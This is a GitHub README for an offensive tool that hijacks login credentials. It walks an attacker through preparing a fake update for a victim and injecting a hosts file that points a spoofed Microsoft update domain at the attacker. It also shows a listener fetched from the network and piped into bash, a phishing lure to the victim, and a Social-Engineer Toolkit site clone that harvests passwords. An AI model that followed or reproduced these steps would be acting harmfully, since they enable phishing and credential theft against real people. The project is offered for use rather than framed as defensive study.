# WARNING: This is a development project and is not READY for USING ;)
- BR
------------------------------------------------------------------------------------------
# SSTC-HTTPS-hijack-login-credentials 
- by nu11secur1ty

![](https://github.com/nu11secur1ty/SSTC-HTTPS-hijack-login-credentials/blob/master/logo/hijacking.jpg)
=======================================================================================================


***Installing requirements and tools:***

-  [git](https://github.com/trustedsec/social-engineer-toolkit)

-  [curl](https://curl.haxx.se/)

-  [apache2](https://httpd.apache.org/docs/2.4/howto/public_html.html)


------------------------------------------------------------

# Exploit steps:
- PWN OS HTTPS hijacking

1. - Preparing a fake update for the victim:
```bash
git clone https://github.com/nu11secur1ty/SSTC-HTTPS-hijack-login-credentials.git
cd SSTC-HTTPS-hijack-login-credentials/Attacker/sh1mazu_https_fake
bash sh1m@zu.sh
[1]
     enter
```

2. - Preparing your hosts-file for exploiting of the victim:
     
     // fakesite.login.com

```bash
cd SSTC-HTTPS-hijack-login-credentials/Attacker/hosts_fake_inject

bash fakehost.sh
     
     # NOTE: You should set up your Network setup to STATIC!
     
     # For example:
     # with IP 10.10.10.100 or 192.168.1.100
     # Or it'd depend from the local network in leyar2
     # WARNING: The host_injector is working only with these IP's from A class of networks
     //10.10.10.100// and //192.168.1.100//
     
     type the attacker IP 10.10.10.100 # or 192.168.1.100
     
     type the fake domain microsoft.update.com
     
     enter
```
3. - Sending an email or an extra lure on your victim.
```
Тhat's the hardest part ;)
I will give you a decision soon, but until then you should create your own!
There is no easy things in this world. ;)
```
4. - Listening for victim visiting

```bash
     curl -s https://raw.githubusercontent.com/nu11secur1ty/SSTC-HTTPS-hijack-login-credentials/master/Attacker/Hijack-HTTPS-Listener/kazkuvgluvutu.sh | bash
```

5. - After exploiting the victim you should ***Stop Apache2***
```bash
systemct stop apache2.service
```
-------------------------------------------------------------

***SECOND PART***

1. - setoolkit cloning of real website
```bash
setoolkit
1) Social-Engineering Attacks
     set>1
     enter
2) Website Attack Vectors
     set>2
     enter
3) Credential Harvester Attack Method
     set:webattack>3
     enter
2) Site Cloner
     set:webattack>2
     enter
set:webattack> IP address for the POST back in Harvester/Tabnabbing [10.10.10.100]:_your_local_layer2_IP_
     enter
[-] Example: http://www.thisisafakesite.com
set:webattack> Enter the url to clone: _your_site_
     enter
     enter
```
2. - Sending a hijack email of the victim.
```bash

```

3. - Receiving the hits from browser of the victim





